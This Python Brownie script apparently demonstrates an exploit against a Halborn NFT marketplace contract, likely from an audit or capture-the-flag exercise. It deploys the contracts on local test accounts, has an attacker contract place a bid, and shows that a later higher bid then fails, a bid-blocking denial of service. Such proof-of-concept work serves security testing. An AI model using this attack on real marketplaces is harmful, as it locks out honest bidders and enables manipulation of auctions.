from brownie import NFTMarketplace, HalbornNFT, ApeCoin, accounts, attack


def main():

    ### required accounts
    nft_owner = accounts[0]
    ape_owner = accounts[1]
    market_owner = accounts[2]
    bad = accounts[9]
    next_bidder = accounts[8]

    ### get 'interfaces to the contracts'
    ape_contract = ApeCoin.deploy({"from": ape_owner})

    nft_contract = HalbornNFT.deploy({"from": nft_owner})

    market = NFTMarketplace.deploy(
        market_owner, ape_contract.address, nft_contract.address, {"from": market_owner}
    )

    ### mint NFT to nft_owner account
    nft_id = 101
    nft_contract.safeMint(nft_owner, nft_id, {"from": nft_owner})

    ### deploy attacker's contract
    attacker = attack.deploy(market.address, {"from": bad})

    ### place a bid from attacker's contract (see the attack.sol contract)
    attacker.makeBid(nft_id, {"from": bad, "value": 100})

    print("Placed a bid with '100' amount from bad's contract\n")

    print("Trying to place a bid with '1000' amount from Next Bidder's account...\n")

    ### try to place a bid with another account
    market.bid(nft_id, {"value": 1000, "from": next_bidder})

    print("Next Bidder's bid is failed!")
